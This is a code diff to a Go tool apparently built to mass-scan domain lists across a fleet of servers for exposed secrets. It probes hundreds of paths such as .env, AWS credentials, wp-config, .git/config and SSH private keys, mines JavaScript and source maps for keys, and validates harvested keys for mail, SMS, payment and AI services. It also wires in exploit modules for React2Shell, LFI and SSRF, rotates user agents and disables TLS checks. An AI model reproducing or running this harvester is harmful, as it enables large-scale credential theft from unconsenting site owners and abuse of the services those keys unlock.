+	// Separate the base hostname from any path component so that path probing
+	// always targets the root domain (e.g. /.env on example.com, not on
+	// example.com/pages/impressum/.env when the list contains full page URLs).
+	baseDomain := domain
+	if idx := strings.IndexByte(domain, '/'); idx >= 0 {
+		baseDomain = domain[:idx]
+	}
+
 	protocols := []string{proto}
 	if proto == "http" {
 		protocols = append(protocols, "https")
 	}
 
 	for _, p := range protocols {
+		// mainURL is the full input URL (used for jsExtended HTML body scan).
+		// baseURL is the root of the domain (used for path probing).
 		mainURL := fmt.Sprintf("%s://%s", p, domain)
+		baseURL := fmt.Sprintf("%s://%s", p, baseDomain)
+		_ = baseURL // used below in path probe loop
 
 		// Check jika URL ini sudah pernah di-scan
 		if _, loaded := a.VisitedURLs.LoadOrStore(mainURL, true); loaded {
@@ -4083,7 +5235,7 @@ func (a *AWSScanner) createRequest(domain string) {
 			continue
 		}
 
-		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
+		req.Header.Set("User-Agent", nextUA())
 
 		resp, err := client.Do(req)
 
@@ -4096,29 +5248,99 @@ func (a *AWSScanner) createRequest(domain string) {
 			continue
 		}
 
-		body, _ := ioutil.ReadAll(resp.Body)
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
 		resp.Body.Close()
+
+		// Track valid/invalid host counts for stats.json progression metrics.
+		if resp.StatusCode == 200 {
+			globalCounters.mu.Lock()
+			globalCounters.ValidHosts++
+			globalCounters.mu.Unlock()
+		} else {
+			globalCounters.mu.Lock()
+			globalCounters.InvalidHosts++
+			globalCounters.mu.Unlock()
+		}
 
 		var wg sync.WaitGroup
 
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			a.checkAndSaveKeys(string(body), mainURL)
-			jsRegex := regexp.MustCompile(`src=["'](.*?.js)["']`)
-			jsFiles := jsRegex.FindAllStringSubmatch(string(body), -1)
-			for _, js := range jsFiles {
-				if len(js) > 1 {
-					fullJS := resolveURL(mainURL, js[1])
-					if !a.BlacklistPattern.MatchString(fullJS) {
-						if r, e := client.Get(fullJS); e == nil {
-							b, _ := ioutil.ReadAll(r.Body)
-							r.Body.Close()
-							a.checkAndSaveKeys(string(b), fullJS)
+			// JS Extended — scan the raw page HTML body for inline credentials.
+			// Runs on the actual URL from the list (mainURL), not path-appended variants.
+			// This catches API keys hardcoded in <script> blocks, data attributes, etc.
+			if a.Config.ScanningFeatures.JSExtendedScan {
+				a.checkAndSaveKeys(string(body), mainURL)
+			}
+			// JS Scanner — only runs when enabled
+			if a.Config.ScanningFeatures.JSScan {
+				// Scoped to <script src=...> only (case-insensitive); dot before js is
+				// escaped so it cannot match a stray character (e.g. "ajs", "bjs").
+				jsRegex := regexp.MustCompile(`(?i)<script[^>]+src=["']([^"']+\.js[^"']*)["']`)
+				jsFiles := jsRegex.FindAllStringSubmatch(string(body), -1)
+				for _, js := range jsFiles {
+					if len(js) > 1 {
+						fullJS := resolveURL(mainURL, js[1])
+						if !a.BlacklistPattern.MatchString(fullJS) {
+							if r, e := client.Get(fullJS); e == nil {
+								b, _ := io.ReadAll(io.LimitReader(r.Body, 512*1024))
+								r.Body.Close()
+								a.checkAndSaveKeys(string(b), fullJS)
+								// Second-level: extract and scan JS files referenced within this JS file
+								if a.Config.ScanningFeatures.JSScan {
+									subMatches := jsRegex.FindAllStringSubmatch(string(b), -1)
+									var subSrcs []string
+									for _, sm := range subMatches {
+										if len(sm) > 1 {
+											subSrcs = append(subSrcs, resolveURL(fullJS, sm[1]))
+										}
+									}
+									subSrcs = unique(subSrcs)
+									// Limit to 10 sub-JS files per parent to avoid explosion
+									if len(subSrcs) > 10 {
+										subSrcs = subSrcs[:10]
+									}
+									for _, subSrc := range subSrcs {
+										if subSrc == fullJS || strings.HasSuffix(subSrc, ".css") {
+											continue
+										}
+										subReq, subErr := http.NewRequest("GET", subSrc, nil)
+										if subErr != nil {
+											continue
+										}
+										subReq.Header.Set("User-Agent", nextUA())
+										subCtx, subCancel := context.WithTimeout(context.Background(), 10*time.Second)
+										subResp, subErr := client.Do(subReq.WithContext(subCtx))
+										subCancel()
+										if subErr != nil || subResp.StatusCode != 200 {
+											if subResp != nil {
+												subResp.Body.Close()
+											}
+											continue
+										}
+										subBody, _ := io.ReadAll(io.LimitReader(subResp.Body, 512*1024))
+										subResp.Body.Close()
+										if len(subBody) > 0 {
+											a.checkAndSaveKeys(string(subBody), subSrc)
+										}
+									}
+								}
+							}
+							// Probe source map — contains original pre-bundled source which
+							// often retains API keys stripped from the minified bundle.
+							mapURL := fullJS + ".map"
+							if r2, e2 := client.Get(mapURL); e2 == nil {
+								b2, _ := io.ReadAll(io.LimitReader(r2.Body, 512*1024))
+								r2.Body.Close()
+								if len(b2) > 0 {
+									a.checkAndSaveKeys(string(b2), mapURL)
+								}
+							}
 						}
 					}
 				}
-			}
+			} // end JSScan
 		}()
 
 		// Run exploit functions untuk setiap URL
@@ -4127,9 +5349,200 @@ func (a *AWSScanner) createRequest(domain string) {
 			a.ExploitReact2Shell(mainURL, mainURL)
 		}
 
-		commonPaths := append(a.EnvPaths, a.PHPInfoPaths...)
+		// ── Path Scanner (always on) — the core .env list + AWS creds ──
+		commonPaths := append([]string(nil), a.EnvPaths...)
+		commonPaths = append(commonPaths, "/.aws/credentials", "/.aws/config")
 
-		commonPaths = append(commonPaths, "/.aws/credentials")
+		// PHP / WP Scanner
+		if a.Config.ScanningFeatures.PHPInfoScan {
+			commonPaths = append(commonPaths, a.PHPInfoPaths...)
+			commonPaths = append(commonPaths,
+				"/wp-config.php", "/wp-config.php.bak", "/wp-config.php.old",
+				"/wp-config.php.orig", "/wp-config.php~", "/wp-config.bak",
+				"/../wp-config.php", "/wordpress/wp-config.php", "/blog/wp-config.php",
+				"/cms/wp-config.php",
+				"/config.php", "/config/config.php", "/configuration.php",
+				"/config/database.php", "/database.php", "/db.php",
+				"/includes/config.php", "/include/config.php", "/inc/config.php",
+				"/app/config/database.php", "/application/config/database.php",
+				"/config/app.php", "/config/mail.php", "/config/services.php",
+				"/application/config/config.php", "/application/config/email.php",
+				// Laravel log — stack traces frequently contain DB credentials / API keys
+				"/storage/logs/laravel.log",
+				"/storage/logs/laravel-today.log",
+				// WordPress additional
+				"/wp-content/debug.log",
+				"/wp-includes/version.php",
+				// Symfony profiler
+				"/_profiler",
+				"/_profiler/latest",
+			)
+		}
+
+		// Git Scanner
+		if a.Config.ScanningFeatures.GitConfigScan {
+			commonPaths = append(commonPaths,
+				"/.git/config", "/.git/HEAD", "/.git/FETCH_HEAD",
+				"/.git/packed-refs", "/.gitconfig",
+			)
+		}
+
+		// Docker Scanner
+		if a.Config.ScanningFeatures.DockerScan {
+			commonPaths = append(commonPaths,
+				"/docker-compose.yml", "/docker-compose.yaml",
+				"/docker-compose.override.yml", "/docker-compose.prod.yml",
+				"/Dockerfile", "/.docker/config.json", "/compose.yml",
+			)
+		}
+
+		// Config File Scanner — Spring/Django/Rails/.NET/Node
+		if a.Config.ScanningFeatures.ConfigFileScan {
+			commonPaths = append(commonPaths,
+				"/application.properties", "/src/main/resources/application.properties",
+				"/application.yml", "/application.yaml", "/bootstrap.properties", "/bootstrap.yml",
+				"/settings.py", "/config/settings.py", "/app/settings.py", "/core/settings.py",
+				"/settings/base.py", "/settings/production.py", "/settings/local.py", "/local_settings.py",
+				"/appsettings.json", "/appsettings.Production.json", "/appsettings.Development.json",
+				"/Web.config", "/web.config",
+				"/config/database.yml", "/config/secrets.yml", "/config/master.key",
+				"/.npmrc", "/.yarnrc", "/package.json", "/.pypirc", "/pip.conf",
+				"/Procfile", "/app.yaml", "/app.json",
+				"/credentials.json", "/credentials.yml", "/secrets.json", "/secrets.yml",
+				"/.htpasswd", "/nginx.conf",
+				"/dump.sql", "/backup.sql", "/db.sql", "/database.sql",
+				// Spring Boot actuator — /actuator/env exposes ALL env vars including API keys
+				"/actuator/env", "/actuator/configprops", "/actuator/mappings",
+				"/actuator/health", "/actuator/info",
+				// Metrics endpoint — sometimes leaks config labels
+				"/metrics",
+				// Ruby on Rails secret/session initializers
+				"/config/initializers/secret_token.rb",
+				"/config/initializers/session_store.rb",
+				// Python / Django
+				"/requirements.txt",
+				"/manage.py",
+				// Node.js source sometimes directly accessible
+				"/server.js", "/app.js", "/index.js",
+				// Kubernetes / Helm secrets
+				"/values.yaml", "/k8s/secrets.yaml", "/kubernetes/secrets.yaml",
+				// Serverless / CloudFormation
+				"/serverless.yml", "/serverless.yaml",
+				"/sam-template.yml", "/sam-template.yaml",
+				"/cloudformation.yml", "/cloudformation.yaml",
+			)
+		}
+
+		// Backup File Scanner — .bak / .old / .orig copies
+		if a.Config.ScanningFeatures.BackupFileScan {
+			commonPaths = append(commonPaths,
+				"/.env.bak", "/.env.old", "/.env.backup", "/.env.orig", "/.env~", "/.env.save",
+				"/.env.example", "/.env.sample",
+				"/config.bak", "/config.old", "/database.yaml",
+				"/.secret", "/private.key", "/id_rsa",
+				"/wp-login.php",
+				"/wp-admin/",
+				"/administrator/index.php",
+				"/admin/login.php",
+				"/cpanel/",
+				"/.ssh/id_rsa", "/.ssh/authorized_keys",
+				"/.ssh/id_ed25519", "/.ssh/id_ecdsa", "/.ssh/id_dsa",
+				"/.ssh/config", "/id_ed25519", "/server.key",
+				"/home/ubuntu/.ssh/id_rsa", "/root/.ssh/id_rsa",
+				"/setup.cfg",
+				// CI/CD pipeline configs — often contain embedded secrets or env var names
+				"/.travis.yml",
+				"/.circleci/config.yml",
+				"/Jenkinsfile",
+				"/bitbucket-pipelines.yml",
+				"/.gitlab-ci.yml",
+				"/.github/workflows/deploy.yml",
+				"/.github/workflows/ci.yml",
+				"/.github/workflows/release.yml",
+				// Swagger / OpenAPI docs — reveal API structure and sometimes example keys
+				"/swagger.json",
+				"/swagger/v1/swagger.json",
+				"/api-docs",
+				"/api/v1/docs",
+				"/openapi.json",
+				"/openapi.yaml",
+				"/v1/swagger.json",
+				"/v2/swagger.json",
+				"/v3/swagger.json",
+				// Go expvar / debug endpoints
+				"/debug/vars",
+				"/debug/pprof/",
+			)
+		}
+
+		// NVCA Scanner — Node/Vue/Next.js/Nuxt config API endpoints
+		if a.Config.ScanningFeatures.NVCAScan {
+			commonPaths = append(commonPaths,
+				"/.nuxt/",
+				"/.next/server/app-paths-manifest.json",
+				"/.next/routes-manifest.json",
+				"/.next/build-manifest.json",
+				"/nuxt.config.js",
+				"/_nuxt/builds/latest/meta.json",
+				"/config/default.json",
+				"/config/production.json",
+				"/config/local.json",
+				"/config/app.json",
+				"/src/environments/environment.prod.js",
+				"/src/environments/environment.ts",
+				"/src/config.ts",
+				"/src/config.js",
+				"/app/config.js",
+				"/assets/config.json",
+				"/static/config.json",
+				"/public/config.json",
+			)
+		}
+
+		// GPL Scanner — GraphQL introspection and endpoint probing
+		// TODO: add a POST introspection probe ({"query":"{__schema{types{name}}}"})
+		// for endpoints that do not respond to GET with schema data.
+		if a.Config.ScanningFeatures.GPLScan {
+			commonPaths = append(commonPaths,
+				"/graphql",
+				"/api/graphql",
+				"/v1/graphql",
+				"/v2/graphql",
+				"/query",
+				"/gql",
+				"/graphiql",
+				"/playground",
+			)
+		}
+
+		// LIB Scanner — package manifests and .npmrc auth tokens
+		if a.Config.ScanningFeatures.LibScan {
+			commonPaths = append(commonPaths,
+				"/package.json",
+				"/package-lock.json",
+				"/yarn.lock",
+				"/.npmrc",
+				"/.yarnrc",
+				"/.yarnrc.yml",
+				"/composer.json",
+				"/composer.lock",
+				"/Gemfile",
+				"/Gemfile.lock",
+				"/requirements.txt",
+				"/Pipfile",
+				"/Pipfile.lock",
+				"/pyproject.toml",
+				"/.env.example",
+				"/.env.sample",
+				"/go.mod", // may expose internal module paths
+			)
+		}
+
+		// All gated groups have already been appended above — nothing more to add.
+
+		// Deduplicate before scanning: PHPInfoPaths and loadEnvPaths() share several
+		// entries (/config.php, /database.php, etc.) which would otherwise fire twice.
+		commonPaths = unique(commonPaths)
 
 		// Batasi goroutine untuk path scanning
 		sem := make(chan struct{}, 100)
@@ -4140,12 +5553,23 @@ func (a *AWSScanner) createRequest(domain string) {
 				sem <- struct{}{}
 				defer func() { <-sem }()
 
-				fullURL := fmt.Sprintf("%s://%s%s", p, domain, pth)
+				fullURL := fmt.Sprintf("%s://%s%s", p, baseDomain, pth)
 				if r, e := client.Get(fullURL); e == nil {
-					b, _ := ioutil.ReadAll(r.Body)
+					b, _ := io.ReadAll(io.LimitReader(r.Body, 512*1024))
 					r.Body.Close()
 					if len(b) > 0 {
-						a.checkAndSaveKeys(string(b), fullURL)
+						if strings.Contains(pth, ".git/config") || strings.Contains(pth, ".gitconfig") {
+							a.extractGitCredentials(string(b), fullURL)
+						} else {
+							a.checkAndSaveKeys(string(b), fullURL)
+						}
+						// GPL: POST GraphQL introspection if this looks like a GraphQL endpoint
+						if a.Config.ScanningFeatures.GPLScan {
+							pthLower := strings.ToLower(pth)
+							if strings.Contains(pthLower, "graphql") || strings.Contains(pthLower, "/gql") || pth == "/query" {
+								go a.probeGraphQLIntrospection(fullURL)
+							}
+						}
 					}
 				}
 			}(path)
@@ -4171,6 +5595,8 @@ func (a *AWSScanner) DisplaySummary() {
 		{"Total API Keys Found", pterm.Magenta(globalCounters.APIsFoundTotal), ""},
 		{"API Keys Validated (Mail/SMS/Payment/AI/GCP)", pterm.Green(globalCounters.APIsValidated), pterm.Bold.Sprintf("(%.2f%% Success)", apiSuccessRate)},
 		{"Valid SMTP Servers", pterm.FgLightGreen.Sprint(globalCounters.ValidSMTP), ""},
+		{"Peak RPS (requests/sec)", fmt.Sprintf("%.1f", globalCounters.RequestsPerSec), ""},
+		{"Peak PPS (parses/sec)", fmt.Sprintf("%.1f", globalCounters.ParsesPerSec), ""},
 	}
 	pterm.DefaultTable.WithHasHeader().WithData(data).Render()
 
@@ -4263,8 +5689,142 @@ func writeCheckpoint(path string, linesRead int) {
 	}
 }
 
+// logActiveAddons prints every enabled addon at startup so the operator can
+// confirm the full detection suite is loaded before the scan begins.
+func (a *AWSScanner) logActiveAddons() {
+	c := a.Config
+	type addonFlag struct {
+		name    string
+		enabled bool
+	}
+	addons := []addonFlag{
+		// AWS
+		{"AWS Main Scan (AKIA+ASIA)", c.ScanningFeatures.AWSMainScan},
+		{"AWS SES Quota Check", c.AWSChecks.SESQuotaCheck},
+		{"AWS SNS Limit", c.AWSChecks.SNSLimitCheck},
+		{"AWS Fargate Limit", c.AWSChecks.FargateLimitCheck},
+		// Email API
+		{"SendGrid", c.APIValidation.SendGrid},
+		{"Mailgun (legacy)", c.APIValidation.Mailgun},
+		{"Mailgun (new)", c.Features.NewMailgun},
+		{"Brevo / Sendinblue", c.Features.Brevo},
+		{"Mandrill", c.Features.Mandrill},
+		{"MailerSend", c.Features.MailerSend},
+		{"Postmark", c.APIValidation.Postmark},
+		{"SparkPost", c.APIValidation.SparkPost},
+		{"Mailtrap", c.APIValidation.Mailtrap},
+		{"Mailjet", c.APIValidation.Mailjet},
+		{"XSMTP", c.Features.XSMTP},
+		// Payment
+		{"Stripe", c.APIValidation.Stripe},
+		// AI
+		{"OpenAI / AI-all", c.APIValidation.OpenAI || c.APIValidation.AIAll},
+		{"Anthropic", c.APIValidation.Anthropic || c.APIValidation.AIAll},
+		// SMS / Voice
+		{"Twilio", c.APIValidation.Twilio},
+		{"Nexmo / Vonage", c.APIValidation.Nexmo},
+		{"Telnyx", c.APIValidation.Telnyx},
+		{"MessageBird", c.APIValidation.MessageBird},
+		{"Plivo", c.APIValidation.Plivo},
+		// Cloud
+		{"Tencent Cloud", c.APIValidation.Tencent},
+		// SMTP crawl
+		{"SMTP credentials scan", c.ScanningFeatures.SMTPCredentialsScan},
+		// Scan method gates
+		{"JS Scanner", c.ScanningFeatures.JSScan},
+		{"JS Extended (inline HTML scan)", c.ScanningFeatures.JSExtendedScan},
+		{"PHP / phpinfo Scanner", c.ScanningFeatures.PHPInfoScan},
+		{"Git Config Scanner", c.ScanningFeatures.GitConfigScan},
+		{"Docker Compose Scanner", c.ScanningFeatures.DockerScan},
+		{"Config File Scanner", c.ScanningFeatures.ConfigFileScan},
+		{"Backup File Scanner", c.ScanningFeatures.BackupFileScan},
+		{"NVCA Scanner (Node/Vue/Next/Nuxt)", c.ScanningFeatures.NVCAScan},
+		{"GPL Scanner (GraphQL)", c.ScanningFeatures.GPLScan},
+		{"LIB Scanner (package manifests)", c.ScanningFeatures.LibScan},
+		// Exploit methods
+		{"React2Shell", c.ExploitMethods.React2Shell},
+		{"LFI", c.ExploitMethods.LFI},
+		{"SSRF", c.ExploitMethods.SSRF},
+	}
+
+	pterm.DefaultSection.Println("Active Addons")
+	on, off := 0, 0
+	for _, a := range addons {
+		if a.enabled {
+			pterm.Success.Printfln("  ✓  %s", a.name)
+			on++
+		} else {
+			pterm.Warning.Printfln("  ✗  %s (disabled)", a.name)
+			off++
+		}
+	}
+	pterm.Info.Printfln("%d active, %d disabled", on, off)
+}
+
+// startRateTracker updates RequestsPerSec and ParsesPerSec every second and
+// writes a stats.json to the ResultJS directory so Flask can expose the live
+// metrics without any SSH log parsing.
+func startRateTracker() {
+	go func() {
+		ticker := time.NewTicker(1 * time.Second)
+		defer ticker.Stop()
+		for range ticker.C {
+			globalCounters.mu.Lock()
+			newReq := globalCounters.URLsProcessed
+			newParse := globalCounters.APIsFoundTotal
+			globalCounters.RequestsPerSec = float64(newReq - globalCounters.requestSnapshot)
+			globalCounters.ParsesPerSec = float64(newParse - globalCounters.parseSnapshot)
+			globalCounters.requestSnapshot = newReq
+			globalCounters.parseSnapshot = newParse
+			// Update running averages
+			globalCounters.rpsTotal += globalCounters.RequestsPerSec
+			globalCounters.ppsTotal += globalCounters.ParsesPerSec
+			globalCounters.rpsCount++
+			globalCounters.ppsCount++
+			if globalCounters.rpsCount > 0 {
+				globalCounters.AvgRps = globalCounters.rpsTotal / float64(globalCounters.rpsCount)
+				globalCounters.AvgPps = globalCounters.ppsTotal / float64(globalCounters.ppsCount)
+			}
+			rps := globalCounters.RequestsPerSec
+			pps := globalCounters.ParsesPerSec
+			avgRps := globalCounters.AvgRps
+			avgPps := globalCounters.AvgPps
+			processed := globalCounters.URLsProcessed
+			found := globalCounters.APIsFoundTotal
+			validated := globalCounters.APIsValidated
+			loaded := globalCounters.URLsLoaded
+			validHosts := globalCounters.ValidHosts
+			invalidHosts := globalCounters.InvalidHosts
+			globalCounters.mu.Unlock()
+
+			var progression float64
+			if loaded > 0 {
+				progression = float64(processed) / float64(loaded)
+			}
+
+			statsData := map[string]interface{}{
+				"urls_processed":  processed,
+				"apis_found":      found,
+				"apis_validated":  validated,
+				"rps":             rps,
+				"pps":             pps,
+				"avg_rps":         avgRps,
+				"avg_pps":         avgPps,
+				"valid_hosts":     validHosts,
+				"invalid_hosts":   invalidHosts,
+				"progression":     progression,
+				"urls_loaded":     loaded,
+			}
+			if b, err := json.Marshal(statsData); err == nil {
+				_ = os.WriteFile(filepath.Join("ResultJS", "stats.json"), b, 0644)
+			}
+		}
+	}()
+}
+
 func (a *AWSScanner) runBatched(listFile string) {
 	renderBanner()
+	a.logActiveAddons()
 
 	pterm.Info.Println("Calculating total lines for progress bar...")
 	totalLines, err := countLines(listFile)
@@ -4273,11 +5833,38 @@ func (a *AWSScanner) runBatched(listFile string) {
 		os.Exit(1)
 	}
 
-	pterm.Info.Printfln("Total targets: %d. Batch size: %d. Timeout: %ds.", totalLines, batchSize, requestTimeoutSeconds)
-	globalCounters.URLsLoaded = totalLines
+	// Clamp effective range to the portion this worker is responsible for.
+	// lineOffset and lineLimit are set from --offset / --limit flags so the
+	// controller can hand each VPS an exclusive slice of the same list file
+	// without splitting or copying it:
+	//   VPS1: --offset 0       --limit 500000
+	//   VPS2: --offset 500000  --limit 500000
+	//   VPS3: --offset 1000000 --limit 500000
+	effectiveOffset := lineOffset
+	if effectiveOffset < 0 {
+		effectiveOffset = 0
+	}
+	if effectiveOffset > totalLines {
+		effectiveOffset = totalLines
+	}
+	effectiveLimit := lineLimit
+	if effectiveLimit <= 0 || effectiveOffset+effectiveLimit > totalLines {
+		effectiveLimit = totalLines - effectiveOffset
+	}
+	effectiveTotal := effectiveLimit
+
+	if lineOffset > 0 || (lineLimit > 0 && lineLimit != totalLines) {
+		pterm.Info.Printfln("Fleet slice: offset=%d limit=%d (file has %d non-empty lines)",
+			effectiveOffset, effectiveLimit, totalLines)
+	}
+	pterm.Info.Printfln("Total targets: %d. Batch size: %d. Timeout: %ds.", effectiveTotal, batchSize, requestTimeoutSeconds)
+	globalCounters.URLsLoaded = effectiveTotal
+
+	// Start the RPS/PPS rate tracker before the main scan loop begins.
+	startRateTracker()
 
 	a.ProgressBar, _ = pterm.DefaultProgressbar.
-		WithTotal(totalLines).
+		WithTotal(effectiveTotal).
 		WithTitle("Scanning Targets (Batched)").
 		WithShowCount().
 		WithShowElapsedTime().
@@ -4290,17 +5877,29 @@ func (a *AWSScanner) runBatched(listFile string) {
 	}
 	defer file.Close()
 
-	scanner := bufio.NewScanner(file)
+	bufScanner := bufio.NewScanner(file)
 	var batch []string
-	linesRead := 0
+	linesRead := 0 // non-empty lines processed within our slice (written to checkpoint)
+	skipped := 0   // non-empty lines consumed before our window begins
 
-	for scanner.Scan() {
-		linesRead++
-		line := strings.TrimSpace(scanner.Text())
+	for bufScanner.Scan() {
+		line := strings.TrimSpace(bufScanner.Text())
 		if line == "" {
 			continue
 		}
 
+		// Skip lines before our offset window.
+		if skipped < effectiveOffset {
+			skipped++
+			continue
+		}
+
+		// Stop once we've consumed our limit.
+		if effectiveLimit > 0 && linesRead >= effectiveLimit {
+			break
+		}
+
+		linesRead++
 		batch = append(batch, line)
 
 		if len(batch) >= batchSize {
@@ -4323,7 +5922,7 @@ func (a *AWSScanner) runBatched(listFile string) {
 	}
 	writeCheckpoint(checkpointFile, linesRead) // final checkpoint
 
-	if err := scanner.Err(); err != nil {
+	if err := bufScanner.Err(); err != nil {
 		pterm.Error.Printfln("Error reading file: %v", err)
 	}
 
@@ -4331,13 +5930,146 @@ func (a *AWSScanner) runBatched(listFile string) {
 	a.DisplaySummary()
 }
 
+// runPrefilter probes 5 .env paths per domain in parallel and writes any URL
+// whose response is HTTP 200 and whose body contains at least one of the
+// well-known secret key tokens to outputFile.
+func runPrefilter(listFile, outputFile string, threads int) {
+	// Read domains from listFile.
+	domFile, err := os.Open(listFile)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[PREFILTER] cannot open list file: %v\n", err)
+		os.Exit(1)
+	}
+	var domains []string
+	sc := bufio.NewScanner(domFile)
+	for sc.Scan() {
+		line := strings.TrimSpace(sc.Text())
+		if line == "" {
+			continue
+		}
+		// Strip any existing scheme so we can attach our own.
+		line = strings.TrimPrefix(line, "https://")
+		line = strings.TrimPrefix(line, "http://")
+		line = strings.TrimRight(line, "/")
+		if line != "" {
+			domains = append(domains, line)
+		}
+	}
+	domFile.Close()
+	if err := sc.Err(); err != nil {
+		fmt.Fprintf(os.Stderr, "[PREFILTER] read error: %v\n", err)
+	}
+
+	// Build the full list of URLs to probe (5 paths per domain).
+	envPaths := []string{
+		"/.env",
+		"/.env.local",
+		"/api/.env",
+		"/.env.production",
+	}
+	var targets []string
+	for _, domain := range domains {
+		// /.env gets both http and https; the rest are http-only.
+		targets = append(targets, "http://"+domain+"/.env")
+		targets = append(targets, "https://"+domain+"/.env")
+		for _, p := range envPaths[1:] {
+			targets = append(targets, "http://"+domain+p)
+		}
+	}
+
+	secretTokens := []string{
+		"APP_KEY=",
+		"DB_PASSWORD=",
+		"AWS_SECRET_ACCESS_KEY=",
+		"API_KEY=",
+		"SECRET_KEY=",
+		"SENDGRID_API_KEY=",
+		"STRIPE_SECRET_KEY=",
+	}
+
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
+	}
+
+	outFile, err := os.OpenFile(outputFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[PREFILTER] cannot open output file: %v\n", err)
+		os.Exit(1)
+	}
+	defer outFile.Close()
+
+	var (
+		mu       sync.Mutex
+		hitCount int
+	)
+
+	sem := make(chan struct{}, threads)
+	var wg sync.WaitGroup
+
+	for _, target := range targets {
+		wg.Add(1)
+		sem <- struct{}{}
+		go func(rawURL string) {
+			defer wg.Done()
+			defer func() { <-sem }()
+
+			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+			defer cancel()
+
+			req, reqErr := http.NewRequestWithContext(ctx, "GET", rawURL, nil)
+			if reqErr != nil {
+				return
+			}
+			httpClient := &http.Client{Transport: transport, Timeout: 5 * time.Second}
+			resp, doErr := httpClient.Do(req)
+			if doErr != nil {
+				return
+			}
+			defer resp.Body.Close()
+
+			if resp.StatusCode != 200 {
+				return
+			}
+
+			bodyBytes, readErr := io.ReadAll(resp.Body)
+			if readErr != nil {
+				return
+			}
+			body := string(bodyBytes)
+
+			for _, token := range secretTokens {
+				if strings.Contains(body, token) {
+					fmt.Printf("[PREFILTER] hit: %s\n", rawURL)
+					mu.Lock()
+					fmt.Fprintln(outFile, rawURL)
+					hitCount++
+					mu.Unlock()
+					return
+				}
+			}
+		}(target)
+	}
+
+	wg.Wait()
+	fmt.Printf("Prefilter complete: %d hits from %d domains\n", hitCount, len(domains))
+}
+
 func main() {
 	flag.IntVar(&requestTimeoutSeconds, "timeout", 20, "Global timeout for each HTTP request in seconds.")
 	flag.IntVar(&batchSize, "batch", 500000, "Number of URLs to process per batch before forcing GC.")
 	flag.StringVar(&checkpointFile, "checkpoint", "", "Write scan progress (lines read) to this file every 1000 lines for redistribution recovery.")
+	flag.IntVar(&lineOffset, "offset", 0, "Skip the first N non-empty lines (fleet distribution: exclusive slice start).")
+	flag.IntVar(&lineLimit, "limit", 0, "Process at most N non-empty lines (fleet distribution: exclusive slice size; 0 = all).")
 
 	var ipOnlyMode bool
 	flag.BoolVar(&ipOnlyMode, "ip-only", false, "Extract only IP addresses from input and scan them.")
+
+	var prefilterMode bool
+	var prefilterOutput string
+	var prefilterThreads int
+	flag.BoolVar(&prefilterMode, "prefilter", false, "Fast .env pre-filter mode: probe 5 .env paths per domain and record 200 hits.")
+	flag.StringVar(&prefilterOutput, "output", "prefilter_hits.txt", "Output file for --prefilter hits.")
+	flag.IntVar(&prefilterThreads, "threads", 500, "Goroutine concurrency for --prefilter mode.")
 
 	flag.Parse()
 
@@ -4373,6 +6105,12 @@ func main() {
 	if _, err := os.Stat(listFile); os.IsNotExist(err) {
 		pterm.Error.Printfln("File '%s' not found.", listFile)
 		os.Exit(1)
+	}
+
+	// Prefilter mode: fast .env probe — no deep crawl, no credential extraction.
+	if prefilterMode {
+		runPrefilter(listFile, prefilterOutput, prefilterThreads)
+		return
 	}
 
 	// IP-only mode: extract IPs and scan them
